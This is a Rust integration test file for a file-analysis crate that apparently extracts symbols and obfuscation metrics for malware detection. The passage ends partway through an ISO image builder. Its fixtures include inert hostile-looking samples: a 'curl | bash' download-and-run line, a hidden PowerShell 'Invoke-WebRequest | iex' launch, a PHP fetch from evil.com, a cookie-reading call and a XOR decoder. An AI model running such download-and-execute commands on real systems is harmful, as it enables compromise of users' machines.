//! End-to-end tests against synthetic and real fixtures.
//!
//! Every test here asserts the no-duplicate-work guarantee
//! (`parse_count() == 1` after exercising all views) so the contract
//! holds for downstream embedders.

use filefacts::{FileType, Symbol, SymbolKind};

/// Hermetic `open`: these tests assert `parse_count() == 1`, which only
/// holds when this process actually runs the extraction pipeline. The
/// cross-process disk cache is on by default outside filefacts' own unit
/// tests (`!cfg!(test)`), but that guard does not reach integration tests —
/// here the crate is linked as an ordinary dependency, so the cache would
/// serve a warm entry from a prior run and leave the count at 0. Routing
/// every test through these wrappers forces the cache off process-wide.
/// Idempotent and safe under parallel test execution.
fn open(bytes: &[u8]) -> Result<filefacts::ParsedFile<'_>, filefacts::Error> {
    filefacts::cache::set_caching_enabled(false);
    filefacts::open(bytes)
}

fn open_with_path<'a>(
    path: &std::path::Path,
    bytes: &'a [u8],
) -> Result<filefacts::ParsedFile<'a>, filefacts::Error> {
    filefacts::cache::set_caching_enabled(false);
    filefacts::open_with_path(path, bytes)
}

/// Convenience: collect every call target (`Symbol::Call.target`) from a
/// parsed file, dropping dynamic-callee entries.
fn call_targets(parsed: &filefacts::ParsedFile<'_>) -> Vec<String> {
    parsed
        .symbols()
        .iter_kind(SymbolKind::Call)
        .filter_map(|s| match s {
            Symbol::Call { target, .. } => target.clone(),
            _ => None,
        })
        .collect()
}

fn import_names(parsed: &filefacts::ParsedFile<'_>) -> Vec<String> {
    parsed
        .symbols()
        .iter_kind(SymbolKind::Import)
        .filter_map(|s| match s {
            Symbol::Import { name, .. } => Some(name.clone()),
            _ => None,
        })
        .collect()
}

fn function_names(parsed: &filefacts::ParsedFile<'_>) -> Vec<String> {
    parsed
        .symbols()
        .iter_kind(SymbolKind::Function)
        .filter_map(|s| match s {
            Symbol::Function { name, .. } => Some(name.clone()),
            _ => None,
        })
        .collect()
}

#[test]
fn json_manifest_parses_once_through_all_views() {
    let bytes = br#"{"name":"sample","version":"1.0.0","scripts":{"preinstall":"echo hi"}}"#;
    let parsed = open_with_path(std::path::Path::new("package.json"), bytes).unwrap();
    assert_eq!(parsed.fileid().file_type(), FileType::PackageJson);

    let values = parsed.values();
    let strings = parsed.text();
    let metrics = parsed.metrics();

    assert_eq!(values.get("name").and_then(|v| v.as_str()), Some("sample"));
    assert_eq!(
        values.get("scripts.preinstall").and_then(|v| v.as_str()),
        Some("echo hi")
    );
    assert_eq!(
        strings.len(),
        0,
        "JSON manifests do not emit ASCII runs in v1"
    );
    assert!(metrics.get("file.size").unwrap() > 0.0);

    assert_eq!(
        parsed.parse_count(),
        1,
        "all three views must share a single extraction pass"
    );
}

#[test]
fn generic_json_parses_below_limit() {
    let parsed = open_with_path(
        std::path::Path::new("payload.json"),
        br#"{"cookie":"alert(1)"}"#,
    )
    .unwrap();
    assert_eq!(parsed.fileid().file_type(), FileType::Json);
    assert_eq!(
        parsed
            .values()
            .get("cookie")
            .and_then(serde_json::Value::as_str),
        Some("alert(1)")
    );
}

#[test]
fn generic_json_parse_limit_skips_values() {
    let mut bytes = Vec::from(br#"{"blob":""#.as_slice());
    bytes.extend(std::iter::repeat_n(b'a', 76 * 1024));
    bytes.extend_from_slice(br#""}"#);

    let parsed = open_with_path(std::path::Path::new("payload.json"), &bytes).unwrap();
    assert_eq!(parsed.fileid().file_type(), FileType::Json);
    assert_eq!(
        parsed
            .values()
            .get("json.parse.skipped")
            .and_then(serde_json::Value::as_bool),
        Some(true)
    );
    assert!(parsed.values().get("blob").is_none());
}

#[test]
fn zip_archive_emits_member_listing_and_aggregates() {
    // Hand-build a minimal ZIP with three regular-file entries so we
    // don't depend on an external fixture for an integration test.
    let bytes = build_minimal_zip();
    let parsed = open(&bytes).unwrap();
    assert_eq!(parsed.fileid().file_type(), FileType::Zip);

    let values = parsed.values();
    let metrics = parsed.metrics();

    let members = values
        .get("archive.members")
        .and_then(|v| v.as_array())
        .expect("archive.members should be present");
    assert_eq!(members.len(), 3);
    for member in members {
        let header_offset = member
            .get("header_offset")
            .and_then(serde_json::Value::as_u64)
            .expect("zip member header_offset");
        let data_offset = member
            .get("data_offset")
            .and_then(serde_json::Value::as_u64)
            .expect("zip member data_offset");
        let central_header_offset = member
            .get("central_header_offset")
            .and_then(serde_json::Value::as_u64)
            .expect("zip member central_header_offset");
        assert!(data_offset > header_offset);
        assert!(central_header_offset > data_offset);
        assert!(
            member
                .get("crc32")
                .and_then(serde_json::Value::as_u64)
                .is_some()
        );
    }

    let typed_members = parsed.archive_members();
    assert_eq!(typed_members.len(), members.len());
    for (typed, member) in typed_members.iter().zip(members) {
        assert_eq!(
            member.get("path").and_then(serde_json::Value::as_str),
            Some(typed.path.as_str())
        );
        assert_eq!(
            member
                .get("header_offset")
                .and_then(serde_json::Value::as_u64),
            typed.offsets.header
        );
        assert_eq!(
            member
                .get("data_offset")
                .and_then(serde_json::Value::as_u64),
            typed.offsets.data
        );
        assert_eq!(
            member
                .get("central_header_offset")
                .and_then(serde_json::Value::as_u64),
            typed.offsets.central_header
        );
        assert_eq!(
            member.get("crc32").and_then(serde_json::Value::as_u64),
            typed.crc32.map(u64::from)
        );
    }

    assert_eq!(metrics.get("archive.member_count"), Some(3.0));
    assert!(metrics.get("file.entropy").is_some());

    assert_eq!(parsed.parse_count(), 1);
}

#[test]
fn empty_input_classifies_and_exposes_metrics() {
    let parsed = open(&[]).unwrap();
    // An empty byte slice has no meaningful format; we still expose
    // file.size and file.entropy so downstream consumers can
    // observe the degenerate case uniformly.
    assert_eq!(parsed.metrics().get("file.size"), Some(0.0));
    assert_eq!(parsed.metrics().get("file.entropy"), Some(0.0));
    assert_eq!(parsed.parse_count(), 1);
}

#[test]
fn source_ast_borrows_cached_tree_without_extraction_pass() {
    let source = b"function main() { return fetch('https://example.com'); }";
    let parsed = open_with_path(std::path::Path::new("sample.js"), source).unwrap();

    let ast = parsed.source_ast().expect("source AST should be available");
    assert_eq!(ast.source, std::str::from_utf8(source).unwrap());
    assert_eq!(ast.tree.root_node().kind(), "program");
    assert_eq!(
        parsed.parse_count(),
        0,
        "borrowing the AST is not extraction"
    );

    assert!(call_targets(&parsed).contains(&"fetch".to_string()));
    assert_eq!(parsed.parse_count(), 1);
}

#[test]
fn javascript_ast_projection_is_complete() {
    let source = br#"
        const fs = require('fs');
        chrome.cookies.getAll({ url: 'https://example.com' }, (c) => {});
        fetch('https://api.example.com/data');
        const decoded = atob("aGVsbG8=");
    "#;
    let parsed = open_with_path(std::path::Path::new("sample.js"), source).unwrap();
    assert_eq!(parsed.fileid().file_type(), FileType::JavaScript);

    let targets = call_targets(&parsed);
    assert!(
        targets.contains(&"chrome.cookies.getAll".to_string()),
        "expected dotted target in call symbols, got {targets:?}",
    );
    assert!(
        targets.contains(&"fetch".to_string()),
        "fetch should be a call target, got {targets:?}",
    );
    assert!(
        targets.contains(&"atob".to_string()),
        "atob should be a call target, got {targets:?}",
    );

    let chrome_member = parsed
        .symbols()
        .iter_kind(SymbolKind::Member)
        .find_map(|s| match s {
            Symbol::Member { path, offset } if path == "chrome.cookies.getAll" => *offset,
            _ => None,
        });
    let expected_offset = source
        .windows(b"chrome.cookies.getAll".len())
        .position(|window| window == b"chrome.cookies.getAll")
        .expect("fixture contains chrome member") as u64;
    assert_eq!(
        chrome_member,
        Some(expected_offset),
        "member chain should carry its first source offset"
    );

    // Parse count must stay at 1 after exercising all five views.
    let _ = parsed.values();
    let _ = parsed.text();
    let _ = parsed.literals();
    let _ = parsed.metrics();
    let _ = parsed.symbols();
    let _ = parsed.fileid();
    assert_eq!(
        parsed.parse_count(),
        1,
        "all five views must share a single extraction pass"
    );
}

#[test]
fn python_ast_projection_has_imports_bindings_and_nested_literals() {
    let source = br#"import base64
import os
import subprocess as sp
from urllib import request

API_URL = "https://example.invalid/api"

def encode_value(value):
    raw = value.encode("utf-8")
    return base64.b64encode(raw).decode("ascii")

class Runner:
    def __init__(self, home):
        self.home = home

    async def fetch(self, name):
        payload = {"path": f"{self.home}/{name}.txt", "kind": "probe"}
        response = request.urlopen(API_URL, data=str(payload).encode("utf-8"))
        return response.read().decode("utf-8")

def run_command():
    env_copy = os.environ.copy()
    return sp.check_output(["/bin/echo", env_copy.get("USER", "unknown")]).decode()
"#;
    let parsed = open_with_path(std::path::Path::new("sample.py"), source).unwrap();
    assert_eq!(parsed.fileid().file_type(), FileType::Python);

    let imports = import_names(&parsed);
    assert!(
        imports.contains(&"subprocess".to_string()),
        "aliased import keeps the bare module name, got {imports:?}"
    );
    // The alias (`sp`) is now a structured field, not concatenated into name.
    let sp_alias = parsed.symbols().iter().find_map(|s| match s {
        filefacts::Symbol::Import {
            name,
            alias: Some(a),
            ..
        } if name == "subprocess" => Some(a.clone()),
        _ => None,
    });
    assert_eq!(
        sp_alias.as_deref(),
        Some("sp"),
        "aliased import should carry the alias in the structured `alias` field"
    );
    assert!(
        imports.contains(&"request".to_string()),
        "from-import local names should be visible, got {imports:?}"
    );

    let targets = call_targets(&parsed);
    assert!(
        targets.contains(&"sp.check_output().decode".to_string()),
        "method calls on call results should keep the source chain, got {targets:?}",
    );

    // Module-level string binding for API_URL — verify the bind exists
    // with the right target/shape. Literal-value matching now
    // happens via the top-level `literals[]` collection correlated by
    // offset; we keep the simpler structural assertion here.
    let bind_targets: Vec<(&str, filefacts::ArgShape)> = parsed
        .symbols()
        .iter_kind(SymbolKind::Bind)
        .filter_map(|s| match s {
            Symbol::Bind { target, shape, .. } => Some((target.as_str(), *shape)),
            _ => None,
        })
        .collect();
    assert!(
        bind_targets
            .iter()
            .any(|(t, sh)| *t == "API_URL" && *sh == filefacts::ArgShape::String),
        "module string constants should be exposed as bind facts, got {bind_targets:?}",
    );

    assert_eq!(parsed.parse_count(), 1);
}

#[test]
fn shell_and_powershell_commands_populate_ast_calls() {
    let shell = br#"#!/bin/sh
curl -sL "http://example.invalid/stage.sh" | bash
-H "Header: value"
chmod +x ./stage.sh
"#;
    let parsed = open_with_path(std::path::Path::new("stage.sh"), shell).unwrap();
    let targets = call_targets(&parsed);
    assert!(
        targets.contains(&"curl".to_string()) && targets.contains(&"bash".to_string()),
        "shell command names should be call targets, got {targets:?}",
    );
    assert!(
        !targets.iter().any(|t| t.starts_with('-')),
        "shell option tokens should not become command targets, got {targets:?}",
    );

    let ps = br#"Invoke-WebRequest -Uri "http://example.invalid/stage.ps1" | iex
Start-Process powershell -ArgumentList "-nop", "-w hidden"
"#;
    let parsed = open_with_path(std::path::Path::new("stage.ps1"), ps).unwrap();
    let targets = call_targets(&parsed);
    assert!(
        targets.contains(&"Invoke-WebRequest".to_string())
            && targets.contains(&"iex".to_string())
            && targets.contains(&"Start-Process".to_string()),
        "PowerShell command names should be call targets, got {targets:?}",
    );
}

#[test]
fn typed_fact_views_are_not_mirrored_in_values() {
    let source = br"
        import fs from 'fs';
        class Runner {}
        function main() { return 'ok'; }
        fetch('https://example.com');
    ";
    let parsed = open_with_path(std::path::Path::new("sample.js"), source).unwrap();

    assert!(
        !import_names(&parsed).is_empty(),
        "imports should populate the unified Symbols view"
    );
    assert!(
        function_names(&parsed).iter().any(|n| n == "main"),
        "function definitions should populate the unified Symbols view"
    );
    assert!(
        !parsed.literals().is_empty(),
        "literals view should be populated"
    );
    assert!(
        !parsed.symbols().is_empty(),
        "Symbols view should be populated"
    );

    let values = parsed.values();
    assert_eq!(
        values.get("source.language").and_then(|v| v.as_str()),
        Some("javascript")
    );
    for path in [
        "imports",
        "functions",
        "classes",
        "strings",
        "ast",
        "symbols",
    ] {
        assert!(
            values.get(path).is_none(),
            "{path} must live only in its typed filefacts view"
        );
    }
}

#[test]
fn binary_typed_fact_views_are_not_mirrored_in_values() {
    let bytes = std::fs::read("tests/fixtures/test.exe").expect("PE fixture present");
    let parsed = open(&bytes).unwrap();

    assert!(
        !import_names(&parsed).is_empty(),
        "imports should populate the unified Symbols view"
    );
    assert!(
        !parsed.sections().is_empty(),
        "sections typed view should be populated"
    );

    let values = parsed.values();
    for path in [
        "imports",
        "exports",
        "functions",
        "sections",
        "strings",
        "ast",
        "errors",
    ] {
        assert!(
            values.get(path).is_none(),
            "{path} must live only in its typed filefacts view"
        );
    }
}

#[test]
fn ast_metrics_mirror_ast_paths() {
    // Verify the metric-naming convention: AST-derived metrics use
    // the `ast.` prefix and mirror the view's path shape.
    let source = b"const a = [1,2,3,4,5,6,7,8,9,10,11,12]; const u = 'a'+'b'+'c'+'d';";
    let parsed = open_with_path(std::path::Path::new("x.js"), source).unwrap();
    let m = parsed.metrics();
    assert!(m.get("ast.node_count").unwrap_or(0.0) > 0.0);
    assert_eq!(m.get("ast.max_array_len"), Some(12.0));
    assert_eq!(m.get("ast.max_concat_chain"), Some(4.0));
}

#[test]
fn non_source_file_yields_empty_ast() {
    let parsed = open(b"{\"name\":\"x\"}").unwrap();
    // No view has been requested yet — parse_count is still 0.
    assert_eq!(parsed.parse_count(), 0);
    // The first view access (any of them) bumps parse_count to 1.
    assert!(parsed.symbols().is_empty());
    assert_eq!(parsed.parse_count(), 1);
    // Subsequent view accesses share the same cached extraction.
    let _ = parsed.values();
    let _ = parsed.text();
    let _ = parsed.literals();
    let _ = parsed.metrics();
    assert_eq!(
        parsed.parse_count(),
        1,
        "non-source files still honour the single-parse contract"
    );
}

#[test]
fn unrecognised_bytes_still_extract_generic_metrics() {
    let bytes = vec![0xaa_u8; 4096];
    let parsed = open(&bytes).unwrap();
    let m = parsed.metrics();
    assert_eq!(m.get("file.size"), Some(4096.0));
    // A single repeated byte has zero entropy.
    assert!(m.get("file.entropy").unwrap().abs() < 1e-9);
    assert_eq!(parsed.parse_count(), 1);
}

/// open_with_path should populate file.basename and file.stem in the
/// values tree so traits can match on them via
/// `type: value, path: file.basename`.
#[test]
fn open_with_path_populates_file_basename_and_stem() {
    let bytes = b"# Hello\n";
    let parsed = open_with_path(std::path::Path::new("/tmp/README.md"), bytes).unwrap();
    let values = parsed.values();
    assert_eq!(
        values.get("file.basename").and_then(|v| v.as_str()),
        Some("README.md")
    );
    assert_eq!(
        values.get("file.stem").and_then(|v| v.as_str()),
        Some("README")
    );
}

/// open() without a path supplies no basename, so neither value path
/// shows up. Trait-level matchers correctly report "value not present"
/// rather than firing on a nonsense empty string.
#[test]
fn open_without_path_omits_file_basename() {
    let bytes = b"\x7fELF\x02\x01\x01\x00";
    let parsed = open(bytes).unwrap();
    let values = parsed.values();
    assert!(values.get("file.basename").is_none());
    assert!(values.get("file.stem").is_none());
}

/// Stem-vs-extension semantics: a dotfile keeps its leading dot in
/// the stem (matches Python pathlib).
#[test]
fn file_stem_handles_dotfiles() {
    let parsed = open_with_path(std::path::Path::new("/p/.gitignore"), b"").unwrap();
    let v = parsed.values();
    assert_eq!(
        v.get("file.basename").and_then(|x| x.as_str()),
        Some(".gitignore")
    );
    assert_eq!(
        v.get("file.stem").and_then(|x| x.as_str()),
        Some(".gitignore")
    );
}

/// Build a minimal ZIP containing three regular-file entries with
/// distinct paths. Pure-Rust, no external test fixture required.
fn build_minimal_zip() -> Vec<u8> {
    use std::io::Write;
    use zip::write::SimpleFileOptions;
    let mut buf = Vec::new();
    let cursor = std::io::Cursor::new(&mut buf);
    let mut writer = zip::ZipWriter::new(cursor);
    let options = SimpleFileOptions::default().compression_method(zip::CompressionMethod::Stored);

    writer.start_file("a.txt", options).unwrap();
    writer.write_all(b"alpha\n").unwrap();
    writer.start_file("dir/b.txt", options).unwrap();
    writer.write_all(b"beta\n").unwrap();
    writer.start_file("dir/c.txt", options).unwrap();
    writer.write_all(b"gamma\n").unwrap();
    writer.finish().unwrap();
    buf
}

/// Operator density is exposed as `ast.op.<name>` metrics, keyed by canonical
/// operator name (counted inline in the single AST walk, O(1) to match, no
/// per-occurrence facts) so rules can match `type: metrics, field: 'ast.op.xor', min: N`.
#[test]
fn python_xor_operator_density_metric() {
    let source = br#"def dec(b, k):
    return bytes(c ^ k[i % len(k)] for i, c in enumerate(b))
x = a ^ b ^ c
"#;
    let parsed = open_with_path(std::path::Path::new("x.py"), source).unwrap();
    let m = parsed.metrics();
    assert_eq!(m.get("ast.op.xor"), Some(3.0), "three `^` operators -> xor");
    assert_eq!(m.get("ast.op.mod"), Some(1.0), "one `%` operator -> mod");
}

/// Identity-proxy functions (`function(x){ return x }`) need a param↔return
/// backreference no regex can express; the walker checks it and exposes the
/// count as `ast.identity_function_count`.
#[test]
fn js_identity_function_density_metric() {
    let source = br#"
        function a(x) { return x; }
        function b(y) { return y; }
        const c = (z) => z;
        function d(p, q) { return p + q; }
    "#;
    let parsed = open_with_path(std::path::Path::new("x.js"), source).unwrap();
    assert_eq!(
        parsed.metrics().get("ast.identity_function_count"),
        Some(3.0),
        "a, b, and the arrow are identity proxies; d is not"
    );
}

/// Comment bodies are exposed as the comment-scoped string tier so rules
/// can match keywords that appear only in comments (lowest false
/// positives — a keyword in code or a string never reaches this tier).
#[test]
fn comment_bodies_are_exposed_as_comment_facts() {
    let source = br#"// this hides a rootkit in the kernel
int legit_function(void) { return 0; }
/* multi-line
   stealth note */
"#;
    let parsed = open_with_path(std::path::Path::new("m.c"), source).unwrap();
    let comments = parsed.comments();
    let joined: String = comments
        .iter()
        .map(|c| c.text.as_str())
        .collect::<Vec<_>>()
        .join("\n");
    assert!(
        joined.contains("rootkit"),
        "comment body should expose 'rootkit': {joined:?}"
    );
    assert!(
        joined.contains("stealth"),
        "multi-line comment body should expose 'stealth': {joined:?}"
    );
    // The function name is NOT a comment — must not leak into this tier.
    assert!(
        !joined.contains("legit_function"),
        "code must not appear in comment tier"
    );
    assert_eq!(parsed.parse_count(), 1);
}

/// Constructor calls (`new ProcessBuilder()`, `new java.io.File()`) resolve to
/// `Symbol::Call` targets so `kind: call` rules can match them — the type-name
/// node (Java `type_identifier`/`scoped_type_identifier`) must not drop to None.
#[test]
fn java_constructor_calls_resolve_to_call_targets() {
    let src = br#"class C { void m() { Runtime r = new ProcessBuilder("sh"); var o = new java.io.ObjectInputStream(x); } }"#;
    let parsed = open_with_path(std::path::Path::new("C.java"), src).unwrap();
    let targets = call_targets(&parsed);
    assert!(
        targets.contains(&"ProcessBuilder".to_string()),
        "new ProcessBuilder() -> call target: {targets:?}"
    );
    assert!(
        targets.iter().any(|t| t.contains("ObjectInputStream")),
        "new java.io.ObjectInputStream() -> call target: {targets:?}"
    );
}

#[test]
fn csharp_qualified_constructor_resolves() {
    let src =
        br#"class C { void m() { var r = new System.Random(); var f = new BinaryFormatter(); } }"#;
    let parsed = open_with_path(std::path::Path::new("C.cs"), src).unwrap();
    let targets = call_targets(&parsed);
    assert!(
        targets
            .iter()
            .any(|t| t.contains("System.Random") || t == "Random"),
        "System.Random: {targets:?}"
    );
    assert!(
        targets.iter().any(|t| t.contains("BinaryFormatter")),
        "BinaryFormatter: {targets:?}"
    );
}

#[test]
fn string_return_functions_are_counted() {
    let src = br#"
        function a() { return "alpha"; }
        function b() { return "beta"; }
        function c(x) { return x + 1; }
        const d = () => "delta";
    "#;
    let parsed = open_with_path(std::path::Path::new("s.js"), src).unwrap();
    assert_eq!(
        parsed.metrics().get("ast.string_return_function_count"),
        Some(3.0),
        "a, b, and the arrow return string literals; c returns an expression"
    );
}

#[test]
fn interpolated_template_url_builders_are_not_counted() {
    // Arrow functions returning an *interpolated* template literal are URL builders /
    // computed values, not substitution-table decoder entries. They must NOT count
    // toward the obfuscation signal. Regression: a benign UniProt browser extension
    // had 14 such URL builders and tripped anti-static/obfuscation/string/reconstruct.
    let src = br#"
        const ALPHAFOLD = (id) => `https://alphafold.ebi.ac.uk/api/prediction/${id}`;
        const FEATURES = (id) => `https://www.ebi.ac.uk/proteins/api/features/${id}`;
        const UNIPROT = (id) => `https://rest.uniprot.org/uniprotkb/${id}.json`;
        function key(p) { return `${p.position}-${p.category}`; }
    "#;
    let parsed = open_with_path(std::path::Path::new("u.js"), src).unwrap();
    assert_eq!(
        parsed.metrics().get("ast.string_return_function_count"),
        None,
        "interpolated template returns are computed values, not static string literals"
    );
}

#[test]
fn non_interpolated_template_returns_are_counted() {
    // A template literal with no `${...}` is effectively a static string literal.
    let src = br#"
        const a = () => `alpha`;
        const b = () => `beta`;
        function c() { return `gamma`; }
        function d() { return `delta`; }
    "#;
    let parsed = open_with_path(std::path::Path::new("t.js"), src).unwrap();
    assert_eq!(
        parsed.metrics().get("ast.string_return_function_count"),
        Some(4.0),
        "static (non-interpolated) templates are string literals"
    );
}

#[test]
fn xor_mod_loop_is_detected() {
    // Python rolling-XOR decode: data[i] ^ key[i % len(key)]
    let py = br#"def dec(b,k):
    return bytes(c ^ k[i % len(k)] for i,c in enumerate(b))
"#;
    let p = open_with_path(std::path::Path::new("d.py"), py).unwrap();
    assert!(
        p.metrics().get("ast.xor_mod_loop_count").unwrap_or(0.0) >= 1.0,
        "python rolling-xor: {:?}",
        p.metrics().get("ast.xor_mod_loop_count")
    );
    // Plain xor without modulo must NOT count.
    let plain = open_with_path(std::path::Path::new("p.py"), b"x = a ^ b\n").unwrap();
    assert_eq!(plain.metrics().get("ast.xor_mod_loop_count"), None);
}

#[test]
fn php_call_string_arg_value_is_captured() {
    let src = br#"<?php $d = file_get_contents("http://evil.com/x");"#;
    let p = open_with_path(std::path::Path::new("f.php"), src).unwrap();
    let arg = p
        .symbols()
        .iter_kind(SymbolKind::Call)
        .find_map(|s| match s {
            Symbol::Call {
                target: Some(t),
                args,
                ..
            } if t == "file_get_contents" => Some(args.clone()),
            _ => None,
        })
        .expect("file_get_contents call");
    assert!(
        matches!(arg.first(), Some(filefacts::Arg::String { value }) if value.contains("http://evil.com")),
        "PHP string arg value should be captured: {arg:?}"
    );
}

#[test]
fn numeric_array_max_length_metric() {
    let py = b"a = [112, 97, 121, 108, 111, 97, 100]\nb = ['x','y','z']\n";
    let p = open_with_path(std::path::Path::new("n.py"), py).unwrap();
    assert_eq!(
        p.metrics().get("ast.max_numeric_array"),
        Some(7.0),
        "the 7-int array counts; the string array does not"
    );
}

#[test]
fn numeric_sequence_max_length_metric() {
    // JS comma sequence of numeric literals (comma-constant obfuscation).
    let js = b"var x = (1, 2, 3, 4, 5);\n";
    let p = open_with_path(std::path::Path::new("s.js"), js).unwrap();
    assert_eq!(p.metrics().get("ast.max_numeric_seq"), Some(5.0));
}

#[test]
fn const_return_function_count_metric() {
    let js =
        b"function a(){ return 0; }\nfunction b(){ return 'x'; }\nfunction id(y){ return y; }\n";
    let p = open_with_path(std::path::Path::new("c.js"), js).unwrap();
    // a() and b() are parameterless const-returns; id(y) is an identity proxy, not counted.
    assert_eq!(
        p.metrics().get("ast.const_return_function_count"),
        Some(2.0)
    );
}

#[test]
fn self_compare_count_metric() {
    // `5 - 5` (useless arithmetic) and `x === x` (opaque) count; `n !== n`
    // (the NaN idiom) does not.
    let js = b"var a = 5 - 5;\nif (x === x) {}\nif (n !== n) {}\n";
    let p = open_with_path(std::path::Path::new("sc.js"), js).unwrap();
    assert_eq!(p.metrics().get("ast.self_compare_count"), Some(2.0));
}

#[test]
fn infinite_loop_count_metric() {
    let rb = b"while true\n  break\nend\n";
    let p = open_with_path(std::path::Path::new("l.rb"), rb).unwrap();
    assert_eq!(p.metrics().get("ast.infinite_loop_count"), Some(1.0));
}

#[test]
fn infinite_loop_js_while_true() {
    let js = b"while (true) { f(); }\nwhile (x < 10) { g(); }\n";
    let p = open_with_path(std::path::Path::new("w.js"), js).unwrap();
    // Only `while (true)` is infinite; the bounded loop is not.
    assert_eq!(p.metrics().get("ast.infinite_loop_count"), Some(1.0));
}

// ---------------------------------------------------------------------------
// Optical-disc images
// ---------------------------------------------------------------------------

/// Build a minimal but conforming ISO 9660 image with an optional Joliet
/// namespace, in pure Rust so no binary fixture is needed.
///
/// Layout (2048-byte sectors): 16 reserved, then PVD, Joliet SVD, terminator,
/// both path tables, the ISO 9660 root extent, the Joliet root extent, then
/// one sector of file data per member.
///
/// `joliet_only` members appear in the Joliet directory tree and *not* in the
/// ISO 9660 one — the namespace-divergence case a reader that follows a
/// single tree cannot see.
fn build_minimal_iso(
    files: &[(&str, &str, &[u8])],
    joliet_only: &[(&str, &[u8])],
    application_id: &str,
    trailing: &[u8],
) -> Vec<u8> {
    const SECTOR: usize = 2048;

    fn both32(v: u32) -> Vec<u8> {
        let mut o = v.to_le_bytes().to_vec();
        o.extend_from_slice(&v.to_be_bytes());
        o
    }
    fn both16(v: u16) -> Vec<u8> {
        let mut o = v.to_le_bytes().to_vec();
        o.extend_from_slice(&v.to_be_bytes());
        o
    }
    fn pad(mut v: Vec<u8>, n: usize) -> Vec<u8> {
        v.resize(n, 0);
        v
    }
    fn astr(s: &str, n: usize) -> Vec<u8> {
        let mut v = s.as_bytes().to_vec();
        v.resize(n, b' ');
        v
    }
    fn ucs2(s: &str) -> Vec<u8> {
        s.encode_utf16().flat_map(u16::to_be_bytes).collect()
    }

    /// One directory record. `name` is already in the namespace's encoding.
    fn dirrec(name: &[u8], lba: u32, size: u32, flags: u8) -> Vec<u8> {
        let mut b = vec![0_u8, 0]; // length placeholder, ext-attr length
        b.extend(both32(lba));
        b.extend(both32(size));
        b.extend([126, 3, 23, 17, 30, 20, 8]); // recording date, +02:00
        b.push(flags);
        b.extend([0, 0]); // file unit size, interleave gap
        b.extend(both16(1)); // volume sequence number
        b.push(name.len() as u8);
        b.extend_from_slice(name);
        if name.len() % 2 == 0 {
            b.push(0); // pad the name field to an even length
        }
        b[0] = b.len() as u8;
        b
    }

    fn volume_descriptor(
        kind: u8,
        root_lba: u32,
        total_sectors: u32,
        joliet: bool,
        application_id: &str,
        path_lba: u32,
    ) -> Vec<u8> {
        let mut v = vec![kind];
        v.extend_from_slice(b"CD001");
        v.push(1); // descriptor version
        v.push(0); // unused
        v.extend(vec![0_u8; 32]); // system identifier
        v.extend(if joliet {
            pad(ucs2("TESTVOL"), 32)
        } else {
            astr("TESTVOL", 32)
        });
        v.extend(vec![0_u8; 8]);
        v.extend(both32(total_sectors));
        // Escape sequences: `%/E` selects Joliet UCS-2 level 3.
        v.extend(if joliet {
            pad(b"%/E".to_vec(), 32)
        } else {
            vec![0_u8; 32]
        });
        v.extend(both16(1)); // volume set size
        v.extend(both16(1)); // volume sequence number
        v.extend(both16(SECTOR as u16));
        v.extend(both32(10)); // path table size
        v.extend(path_lba.to_le_bytes());
        v.extend(0_u32.to_le_bytes());
        v.extend((path_lba + 1).to_be_bytes());
        v.extend(0_u32.to_be_bytes());
        v.extend(dirrec(&[0], root_lba, SECTOR as u32, 0x02));
        let mut v = pad(v, 190);
        v.extend(if joliet {
            pad(ucs2(""), 128)
        } else {
            astr("", 128)
        }); // volume set identifier
        v.extend(astr("", 128)); // publisher
        v.extend(astr("", 128)); // data preparer
        v.extend(astr(application_id, 128));
        v.extend(astr("", 37 * 3)); // copyright / abstract / bibliographic
        v.extend(b"2026032317321065");
        v.push(8);
        v.extend(b"2026032317321065");
        v.push(8);
        v.extend(vec![b'0'; 16]);
        v.push(0);
        v.extend(vec![b'0'; 16]);
        v.push(0);
        v.push(1); // file structure version
        pad(v, SECTOR)
    }

    // Sector plan.
    let pvd_lba = 16_u32;
    let svd_lba = 17_u32;
    let term_lba = 18_u32;
    let path_lba = 19_u32;
    let root_lba = 21_u32;
    let jroot_lba = 22_u32;
    let mut next = 23_u32;
    let placed: Vec<(&str, &str, &[u8], u32)> = files
        .iter()
        .map(|(iso, jol, body)| {
            let lba = next;
            next += (body.len().div_ceil(SECTOR)).max(1) as u32;
            (*iso, *jol, *body, lba)
        })
        .collect();
    let jonly: Vec<(&str, &[u8], u32)> = joliet_only
        .iter()
        .map(|(jol, body)| {
            let lba = next;
            next += (body.len().div_ceil(SECTOR)).max(1) as u32;
            (*jol, *body, lba)
        })
        .collect();
    let total = next;

    let mut img = vec![0_u8; total as usize * SECTOR];
    let mut put = |lba: u32, blob: &[u8]| {
        let start = lba as usize * SECTOR;
        img[start..start + blob.len()].copy_from_slice(blob);
    };

    put(
        pvd_lba,
        &volume_descriptor(1, root_lba, total, false, application_id, path_lba),
    );
    put(
        svd_lba,
        &volume_descriptor(2, jroot_lba, total, true, application_id, path_lba),
    );
    put(
        term_lba,
        &pad([&[255_u8][..], b"CD001", &[1]].concat(), SECTOR),
    );

    // Path tables: one record naming the root directory, L then M.
    let mut lpt = vec![1_u8, 0];
    lpt.extend(root_lba.to_le_bytes());
    lpt.extend(1_u16.to_le_bytes());
    lpt.extend([0, 0]);
    put(path_lba, &pad(lpt, SECTOR));
    let mut mpt = vec![1_u8, 0];
    mpt.extend(root_lba.to_be_bytes());
    mpt.extend(1_u16.to_be_bytes());
    mpt.extend([0, 0]);
    put(path_lba + 1, &pad(mpt, SECTOR));

    // ISO 9660 root: `.`, `..`, then the shared members under their 8.3 names.
    let mut iso_root = dirrec(&[0], root_lba, SECTOR as u32, 0x02);
    iso_root.extend(dirrec(&[1], root_lba, SECTOR as u32, 0x02));
    for (iso_name, _, body, lba) in &placed {
        iso_root.extend(dirrec(
            format!("{iso_name};1").as_bytes(),
            *lba,
            body.len() as u32,
            0,
        ));
    }
    put(root_lba, &pad(iso_root, SECTOR));

    // Joliet root: the same members under their long names, plus any member
    // that exists in this namespace alone.
    let mut jol_root = dirrec(&[0], jroot_lba, SECTOR as u32, 0x02);
    jol_root.extend(dirrec(&[1], jroot_lba, SECTOR as u32, 0x02));
    for (_, jol_name, body, lba) in &placed {
        jol_root.extend(dirrec(
            &ucs2(&format!("{jol_name};1")),
            *lba,
            body.len() as u32,
            0,
        ));
    }
    for (jol_name, body, lba) in &jonly {
        jol_root.extend(dirrec(
            &ucs2(&format!("{jol_name};1")),
            *lba,
            body.len() as u32,
            0,
        ));
    }
    put(jroot_lba, &pad(jol_root, SECTOR));

    for (_, _, body, lba) in &placed {
        put(*lba, body);
    }
